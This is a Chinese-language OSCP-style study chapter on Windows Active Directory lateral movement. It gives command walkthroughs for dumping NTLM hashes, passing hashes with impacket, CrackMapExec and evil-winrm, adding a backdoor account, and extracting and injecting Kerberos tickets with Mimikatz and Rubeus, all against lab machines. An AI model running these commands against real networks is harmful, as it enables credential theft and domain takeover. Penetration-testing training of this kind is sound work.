# Ch 34 — Pass-the-Hash / Pass-the-Ticket

> 目標：掌握 AD 環境中橫向移動的兩個核心技術：不用密碼的 Pass-the-Hash（NTLM）和 Pass-the-Ticket（Kerberos）。

## 橫向移動的意義

OSCP AD 三機器鏈要你：
1. 拿到第一台（普通用戶立足）
2. **橫向移動**到第二台或第三台
3. 最終接管 DC

橫向移動就是「用你在 A 機器拿到的憑證，登入 B 機器」。在 Windows 環境，這通常不需要明文密碼——NTLM hash 就夠了。

## Pass-the-Hash（PtH）

### 原理

Windows NTLM 認證用 hash，不是明文密碼。如果你有使用者的 NTLM hash，可以直接用它認證，不需要知道明文。

### 取得 NTLM Hash

**方法一：Meterpreter hashdump（有 SYSTEM shell）**

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

格式：`Username:RID:LM_hash:NTLM_hash:::`

`aad3b435b51404eeaad3b435b51404ee` 是空 LM hash，可以忽略。  
`8846f7eaee8fb117ad06bdd830b7586c` 是你要的 NTLM hash。

**方法二：secretsdump.py（impacket）**

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    administrator:'password'@10.10.10.x

# 或用 hash（如果已知）
python3 secretsdump.py \
    administrator@10.10.10.x \
    -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

### 用 PtH 連接

**psexec.py**

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
    administrator@10.10.10.x \
    -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

**wmiexec.py**

```bash
python3 wmiexec.py administrator@10.10.10.x -hashes :NTLM_HASH
```

**smbexec.py**

```bash
python3 smbexec.py administrator@10.10.10.x -hashes :NTLM_HASH
```

**CrackMapExec**

```bash
# 確認 hash 是否有效
crackmapexec smb 10.10.10.x -u administrator -H :8846f7eaee8fb117ad06bdd830b7586c

# 執行指令
crackmapexec smb 10.10.10.x -u administrator -H :NTLM_HASH -x "whoami"

# 取 SYSTEM shell
crackmapexec smb 10.10.10.x -u administrator -H :NTLM_HASH --exec-method atexec -x "net user hacker P@ssw0rd /add"
```

**evil-winrm（WinRM port 5985）**

```bash
evil-winrm -i 10.10.10.x -u administrator -H :NTLM_HASH
```

## Pass-the-Ticket（PtT）

### 原理

Kerberos TGT 本身就是「你是誰」的憑證。如果你能從記憶體提取 TGT（或偽造一個），就能以那個使用者的身份操作——不需要密碼。

### 提取 TGT（Mimikatz）

```cmd
# Mimikatz（需要 SYSTEM 或 SeDebugPrivilege）
mimikatz.exe
mimikatz # sekurlsa::tickets /export
# 輸出多個 .kirbi 檔

# 或只列出 ticket 不匯出
mimikatz # sekurlsa::tickets
```

**Rubeus**

```cmd
# 在記憶體中的 Ticket
.\Rubeus.exe klist

# 提取 TGT
.\Rubeus.exe dump /user:alice /nowrap
```

### 注入 Ticket（PtT）

```cmd
# Mimikatz
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:base64_ticket_here

# 確認
klist    # 看有沒有成功注入
```

注入後，在同一個 CMD/PowerShell session 發出的 Kerberos 請求都會用這個 ticket。

### 用 Pass-the-Ticket 橫向移動

```cmd
# 注入 DA 的 TGT 後
dir \\dc.corp.local\C$      # 訪問 DC 的磁碟
psexec.exe \\dc.corp.local cmd.exe   # 在 DC 上開 shell
```

## Overpass-the-Hash（PtH → TGT）

如果你有 NTLM hash 但想用 Kerberos（繞過某些 NTLM 防護）：

```cmd
# Mimikatz：用 NTLM hash 請求 TGT
mimikatz # sekurlsa::pth /user:alice /domain:corp.local /ntlm:HASH /run:powershell.exe

# 這會開一個以 alice 身份的 PowerShell，有 Kerberos TGT
```

**Rubeus**

```cmd
.\Rubeus.exe asktgt /user:alice /rc4:NTLM_HASH /ptt
```

## CrackMapExec 掃描整個子網路

拿到 DA 的 hash 後，可以橫掃整個網段確認：

```bash
# 確認 DA hash 對哪些機器有效
crackmapexec smb 10.10.10.0/24 -u administrator -H :NTLM_HASH

# [+] 代表有效
# [*] (Pwn3d!) 代表是 Local Admin 或 Domain Admin
```

## 本章對應靶機

| 機器 | 橫向移動技術 |
|------|-----------|
| HTB Forest | secretsdump → PtH 到 DC |
| HTB Active | Kerberoasting → DA → PtH |
| HTB Cascade | 橫向移動 + legacy 帳號 |

## 自我檢核

- [ ] 知道 NTLM hash 格式（`LM:NTLM` 中哪個是重要的）
- [ ] 能用 psexec.py `-hashes` 做 PtH
- [ ] 能用 evil-winrm 配合 hash 連接 WinRM
- [ ] 知道 Pass-the-Ticket 和 Pass-the-Hash 使用的是不同的認證協定（Kerberos vs NTLM）

→ [Ch 35 DCSync + Golden Ticket：接管 Domain Controller](./35-domain-dominance.md)
